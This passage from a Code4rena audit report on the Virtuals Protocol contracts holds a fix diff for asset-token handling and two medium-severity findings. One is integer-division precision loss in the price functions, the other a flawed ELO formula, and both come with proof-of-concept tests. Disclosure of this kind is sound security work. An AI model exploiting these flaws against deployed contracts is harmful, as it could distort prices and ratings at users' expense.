class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 withdrawableAmount = application.withdrawableAmount;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        application.withdrawableAmount = 0;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        application.status = ApplicationStatus.Withdrawn;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-        IERC20(assetToken).safeTransfer(application.proposer, withdrawableAmount);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+        IERC20(application.tokenAddress).safeTransfer(application.proposer, withdrawableAmount);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eUpdated \u003ccode\u003eexecuteApplication\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"118\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    function executeApplication(uint256 id, bool canStake) public noReentrant {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // C2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        address lp = IAgentToken(token).liquidityPools()[0];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-        IERC20(assetToken).transfer(token, initialAmount);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+        IERC20(application.tokenAddress).transfer(token, initialAmount);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        IAgentToken(token).addInitialLiquidity(address(this));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eUpdated \u003ccode\u003e_createNewAgentToken\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"119\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e- function _createNewAgentToken(string memory name, string memory symbol) internal returns (address instance) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+ function _createNewAgentToken(string memory name, string memory symbol, address memory applicationAssetToken) internal returns (address instance) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        instance = Clones.clone(tokenImplementation);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        IAgentToken(instance).initialize(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-            [_tokenAdmin, _uniswapRouter, assetToken],          \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+            [_tokenAdmin, _uniswapRouter, applicationAssetToken],          \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            abi.encode(name, symbol),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            _tokenSupplyParams,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            _tokenTaxParams\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        allTradingTokens.push(instance);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        return instance;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis would ensure that changing \u003ccode\u003eassetToken\u003c/code\u003e does not break any flow.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-24-precision-loss-in-pricealast-and-priceblast\" style=\"position:relative;\"\u003e\u003ca href=\"#m-24-precision-loss-in-pricealast-and-priceblast\" aria-label=\"m 24 precision loss in pricealast and priceblast permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-196\"\u003e[M-24] Precision loss in \u003ccode\u003epriceALast\u003c/code\u003e and \u003ccode\u003epriceBLast\u003c/code\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-592\"\u003ehecker_trieu_tien\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-551\"\u003e0xterrah\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-354\"\u003eholtzzx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-466\"\u003ePotEater\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-271\"\u003erayss\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/FPair.sol#L103\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/FPair.sol#L103\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-8\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-8\" aria-label=\"finding description and impact 8 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eThe price calculation functions \u003ccode\u003epriceALast\u003c/code\u003e and \u003ccode\u003epriceBLast\u003c/code\u003e use integer division (\u003ccode\u003e/\u003c/code\u003e) directly on the pool reserves (\u003ccode\u003e_pool.reserve0\u003c/code\u003e, \u003ccode\u003e_pool.reserve1\u003c/code\u003e). Integer division in Solidity truncates any fractional part of the result, leading to significant precision loss.\t\u003c/p\u003e\n\u003ch3 id=\"scenario\" style=\"position:relative;\"\u003e\u003ca href=\"#scenario\" aria-label=\"scenario permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eScenario\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eThe pool has reserves \u003ccode\u003e_pool.reserve1 = 199 * 10**18\u003c/code\u003e and \u003ccode\u003e_pool.reserve0 = 100 * 10**18\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eA call to \u003ccode\u003epriceALast()\u003c/code\u003e executes \u003ccode\u003e_pool.reserve1 / _pool.reserve0\u003c/code\u003e which is \u003ccode\u003e(199 * 10**18) / (100 * 10**18)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eDue to integer division, the result is truncated from the actual price (1.99) to \u003ccode\u003e1\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eAlternatively, if \u003ccode\u003e_pool.reserve1 = 99 * 10**18\u003c/code\u003e and \u003ccode\u003e_pool.reserve0 = 100 * 10**18\u003c/code\u003e, the calculation \u003ccode\u003e(99 * 10**18) / (100 * 10**18)\u003c/code\u003e results in \u003ccode\u003e0\u003c/code\u003e because integer division rounds down. The same logic applies symmetrically to \u003ccode\u003epriceBLast\u003c/code\u003e when \u003ccode\u003e_pool.reserve0\u003c/code\u003e is divided by \u003ccode\u003e_pool.reserve1\u003c/code\u003e.\t\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-28\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-28\" aria-label=\"recommended mitigation steps 28 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eTo fix this issue, the contract should use a fixed-point arithmetic approach. Scale the numerator by a large factor (e.g., \u003ccode\u003e10^18\u003c/code\u003e) before division.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-17\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-17\" aria-label=\"proof of concept 17 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"120\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003edescribe(\u0026quot;Price Calculation Precision Loss\u0026quot;, function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    it(\u0026quot;should demonstrate precision loss in priceALast function\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      const { fPair, router } = await loadFixture(deployFPairFixture);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      // Scenario 1: reserve1 = 199 * 10^18, reserve0 = 100 * 10^18\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      // Expected price: 1.99, but due to integer division, it will be 1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      const reserve0 = parseEther(\u0026quot;100\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      const reserve1 = parseEther(\u0026quot;199\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      // Since only router can call mint, we need to impersonate it\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await fPair.connect(router).mint(reserve0, reserve1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      // Check reserves were set correctly\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      const [actualReserve0, actualReserve1] = await fPair.getReserves();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      expect(actualReserve0).to.equal(reserve0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      expect(actualReserve1).to.equal(reserve1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      // Check price calculation\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      const priceA = await fPair.priceALast();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      console.log(\u0026quot;Actual price should be 1.99, but priceALast() returns:\u0026quot;, priceA.toString());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      // Verify the precision loss - price should be 1 instead of 1.99\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      expect(priceA).to.equal(1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      // Calculate the actual price with higher precision (using JavaScript)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      const actualPrice = Number(formatEther(reserve1)) / Number(formatEther(reserve0));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      console.log(\u0026quot;Actual price calculated with JavaScript:\u0026quot;, actualPrice);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      console.log(\u0026quot;Precision loss:\u0026quot;, actualPrice - Number(priceA));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-25-incorrect-mathematical-logic\" style=\"position:relative;\"\u003e\u003ca href=\"#m-25-incorrect-mathematical-logic\" aria-label=\"m 25 incorrect mathematical logic permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-233\"\u003e[M-25] Incorrect mathematical logic\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-342\"\u003edjshan_eden\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-258\"\u003eMatin\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-706\"\u003eNexarion\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/libs/Elo.sol#L56\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/libs/Elo.sol#L56\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/libs/Elo.sol#L59\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/libs/Elo.sol#L59\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/libs/Elo.sol#L60\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/libs/Elo.sol#L60\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-10\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-10\" aria-label=\"finding description 10 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThere is a fundamental error in the ELO calculation formula. For example, when \u003ccode\u003eratingA=1000\u003c/code\u003e and \u003ccode\u003eratingB=800\u003c/code\u003e, the code calculation result deviates greatly from the standard formula. The core problem lies in the exponent processing:\u003c/p\u003e\n\u003cp\u003eThe correct calculation should be \u003ccode\u003e10^(ratingDiff/400)\u003c/code\u003e, but the code incorrectly converts the exponent through \u003ccode\u003en = 800 ± ratingDiff\u003c/code\u003e and the fourth square root, resulting in an incorrect powered value.\u003c/p\u003e\n\u003ch3 id=\"impact-17\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-17\" aria-label=\"impact 17 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eAll ELO rating changes are calculated incorrectly, the rating system is completely untrustworthy, and attackers can use this vulnerability to obtain abnormally high rating changes.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-29\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-29\" aria-label=\"recommended mitigation steps 29 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eRemove offset:\u003c/strong\u003e Handle the positive and negative rating differences directly.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAccurate exponential calculation:\u003c/strong\u003e Use a high-precision library (such as ABDKMath) to calculate \u003ccode\u003e10^(ratingDiff/400)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAvoid decomposition errors:\u003c/strong\u003e Abandon multi-step square root decomposition and handle the raw exponential directly.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"proof-of-concept-18\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-18\" aria-label=\"proof of concept 18 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e1. Differences between the original formula and the code implementation​:\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eCorrect formula - the expected ELO score is:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"121\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eratingDiff = _negative ? ratingA - ratingB : ratingB - ratingA\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eexpected score = 1 / (1 + 10 ^ (ratingDiff / 